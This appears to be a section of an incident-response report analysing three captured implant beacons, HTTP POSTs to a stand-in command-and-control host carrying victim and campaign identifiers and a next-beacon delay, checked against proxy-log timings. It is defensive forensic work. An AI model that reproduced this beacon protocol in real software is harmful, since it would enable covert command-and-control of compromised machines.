# S3. Three captured beacons, as decoded by LIR

*Flare 1 · LIR note LIR-HTA-1005-04 · TLP:AMBER*

The EDR agent on `wks-r4-12` recorded the plaintext of the implant's outbound requests before they were encrypted, and kept the first three. LIR laid them out as text. In each beacon the body is the same record as in S2, and the `t` field carries the delay the implant chose for its next beacon.

### Beacon 1: Monday 5 October 2026, 08:09:41 UTC

```
POST /s/HV2641 HTTP/1.1
Host: ember-relay.invalid
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
X-Req-Id: HV2641-0c8f2d
Content-Length: 165

v=2;i=0c8f2d;c=HV2641;h=ember-relay.invalid;ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36;t=1171
```

### Beacon 2: Monday 5 October 2026, 08:29:12 UTC

```
POST /s/HV2641 HTTP/1.1
Host: ember-relay.invalid
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
X-Req-Id: HV2641-0c8f2d
Content-Length: 165

v=2;i=0c8f2d;c=HV2641;h=ember-relay.invalid;ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36;t=1251
```

### Beacon 3: Monday 5 October 2026, 08:50:03 UTC

```
POST /s/HV2641 HTTP/1.1
Host: ember-relay.invalid
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
X-Req-Id: HV2641-0c8f2d
Content-Length: 165

v=2;i=0c8f2d;c=HV2641;h=ember-relay.invalid;ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36;t=1214
```

**Check against the proxy log (S9).** Beacon 1 was sent at 08:09:41 and beacon 2 at 08:29:12, so the delay after beacon 1 was 1171 seconds, the value beacon 1 announces. Beacon 3 was sent at 08:50:03, 1251 seconds after beacon 2. The delay after beacon 3 was 1214 seconds.
